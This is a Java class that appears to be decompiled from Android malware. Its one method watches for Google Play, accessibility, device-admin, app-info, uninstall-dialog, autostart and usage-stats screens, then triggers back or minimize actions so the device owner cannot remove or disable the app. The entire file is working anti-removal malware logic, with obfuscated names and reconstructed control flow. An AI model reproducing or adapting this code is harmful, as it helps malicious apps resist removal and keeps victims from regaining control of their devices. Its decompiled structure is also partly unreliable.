package fddo;

import android.content.Context;
import android.util.Log;

import com.sonnokta.p023w;

/* renamed from: fddo.new  reason: invalid class name */
public class Cnew {
    private static String TAG = "bwolf-Cnew";

    /* renamed from: try  reason: not valid java name */
    protected static p023w f72try;

    /* renamed from: fddo  reason: collision with root package name */
    protected boolean f124fddo;

    /* renamed from: for  reason: not valid java name */
    protected String f73for;
    protected Context ifdf;

    /* renamed from: new  reason: not valid java name */
    protected fddo f74new;

    public Cnew(boolean z, Context context, p023w p023w, String str, fddo fddo2) {
        this.f124fddo = z;
        this.ifdf = context;
        f72try = p023w;
        this.f73for = str;
        this.f74new = fddo2;
    }

    /**
     * TODO - CHECK
     * @param r8
     * @param r9
     */
    public void fddo(boolean r8, java.lang.String r9) {
        Log.e(TAG, "--- fddo > Check ---");
        Context contextV1 = this.ifdf;
        p023w p023wV2 = f72try;
        boolean boolV5 = this.f124fddo;
        String strV3 = "prevent_remove";
        String strV4 = "*";
        Ccase caseV6 = new Ccase(contextV1, p023wV2, strV3, strV4, boolV5);
        String strV0 = this.f73for;
        caseV6.m166this(strV0);
        boolean boolV0 = r9.isEmpty();
        int intV1 = 0;
        int intV2 = 1;
        int intP2;

        strV3 = ">>AcsbPreventRemove";
        if (!boolV0) {
            boolV0 = p023w.fddo(r9);
            if (boolV0) {
                if (this.f124fddo) {
                    StringBuilder stringBuilderV0 = new StringBuilder();
                    stringBuilderV0.append("preventRemove: pkg ");
                    stringBuilderV0.append(r9);
                    stringBuilderV0.append(" is blocked");
                    Log.i(strV3, stringBuilderV0.toString());
                }
                intP2 = intV2;
            }
            else
                intP2 = intV1;
        } else
            intP2 = intV1;

        if (caseV6.m52break("gp_pages")) {
            if (this.f124fddo) {
                Log.i(strV3, "preventRemove: GP detected");
            }

            intV1 = intV2;
            intV2 = intP2;
        } if (r8 && caseV6.m52break("acsb_pages")) {
                if (this.f124fddo)
                    Log.i(strV3, "preventRemove: ACSB detected");
        } else if (caseV6.m52break("reset_page")) {
            if (this.f124fddo)
                Log.i(strV3, "preventRemove: reset_page detected");
        } else if (caseV6.m52break("app_page")) {
            if (this.f124fddo)
                Log.i(strV3, "preventRemove: app page detected");
        } else if (caseV6.m52break("devadmins_page")) {
            if (this.f124fddo)
                Log.i(strV3, "preventRemove: device admins page detected");
        } else {
            if (caseV6.m52break("uns_dialog")) {
                if (this.f124fddo) {
                    Log.i(strV3, "preventRemove: uns_dialog detected");
                    intV1 = intV2;
                    intV2 = intP2;
                } else {
                    intV1 = intV2;
                    intV2 = intP2;
                }
            }

            if (Cgoto.grethwjrsfhj()) {
                if (Cthrow.m158new(this.ifdf, "xiaomi_autostart", "").equals("enabled") &&
                        caseV6.m52break("xiaomi_autostart") &&
                        this.f124fddo) {
                    Log.i(strV3, "preventRemove: xiaomi_autostart detected");
                    intV1 = intV2;
                    intV2 = intP2;
                }
            }

            boolean boolP1 = Cgoto.m139transient(this.ifdf);
            if (boolP1) {
                String strP1 = "usage_stats";
                boolP1 = caseV6.m52break(strP1);
                if (boolP1) {
                    boolP1 = this.f124fddo;
                    if (boolP1) {
                        strP1 = "preventRemove: usage_stats detected";
                        Log.i(strV3, strP1);
                        intV1 = intV2;
                        intV2 = intP2;
                    } else {
                        intV1 = intV2;
                        intV2 = intP2;
                    }
                } else {
                    intV2 = intP2;
                }
            } else intV2 = intP2;
        }

        if (intV1 != 0) {
            if (this.f124fddo)
                Log.i(strV3, "preventRemove: back() ...");

            fddo fddoP1 = this.f74new;
            fddoP1.fddo();
        }

        if (intV2 != 0) {
            if (this.f124fddo)
                Log.i(strV3, "preventRemove: minimize() ...");

            fddo fddoP1 = this.f74new;
            fddoP1.m101public();
        }
    }
}
